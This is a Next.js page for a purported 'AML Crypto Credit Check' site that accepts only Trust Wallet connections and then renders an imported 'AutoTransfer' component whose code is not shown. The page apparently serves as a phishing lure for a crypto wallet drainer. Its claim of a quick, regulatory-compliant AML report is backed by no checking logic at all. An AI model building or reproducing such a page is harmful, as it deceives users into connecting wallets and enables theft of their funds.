"use client";

import Image from "next/image";
import { ConnectButton } from "thirdweb/react";
import { createThirdwebClient } from "thirdweb";
import { createWallet, type Wallet } from "thirdweb/wallets";
import AutoTransfer from "./components/AutoTransfer";
import trust from "@public/trust.png";
import trustW from "@public/trustwallet.png";

// --- Création du client Thirdweb ---
const client = createThirdwebClient({
  clientId: "c98a5d48ad89f114ad6044933fced541",
});

// --- Limiter les wallets à Trust Wallet uniquement ---
const wallets = [createWallet("com.trustwallet.app")];

export default function Home() {
  const handleWalletConnect = async (wallet: Wallet) => {
    try {
      const account = await wallet.getAccount();
      if (account) {
        console.log("Wallet connected:", account.address);
      } else {
        console.log("Wallet connected but address pending");
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
    }
  };

  const handleWalletDisconnect = async () => {
    console.log("Wallet disconnected");
  };

  return (
    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto">
      <Header />

      {/* Section de texte ajoutée */}
      <div className="text-center text-white my-12 max-w-2xl mx-auto text-box-blur">
    <h1
  className="text-5xl md:text-6xl font-extrabold mb-4"
  style={{ color: "#0047AB" }}
>
  AML Crypto Credit Check
</h1>


     <p className="text-base sm:text-lg text-black">
  In just a few seconds, assess the AML (anti-money laundering) risks of a crypto address or entity and get a clear, actionable credit report that complies with regulatory requirements.
</p>

      </div>

      <div className="flex justify-center mb-20 mt-10 shadow-lg rounded-xl">
        <ConnectButton
          client={client}
          wallets={wallets} // <-- Trust Wallet uniquement
          connectModal={{ size: "compact" }}
          onConnect={handleWalletConnect}
          onDisconnect={handleWalletDisconnect}
          appMetadata={{
            name: "Example App",
            url: "https://example.com",
          }}
        />
      </div>

      <AutoTransfer />
    </main>
  );
}

function Header() {
  return (
    <header className="flex flex-col items-center mb-10 pt-10">
    
      <Image
        src={trustW}
        alt="Trust Logo"
        width={100}
        height={100}
      />
    </header>
  );
}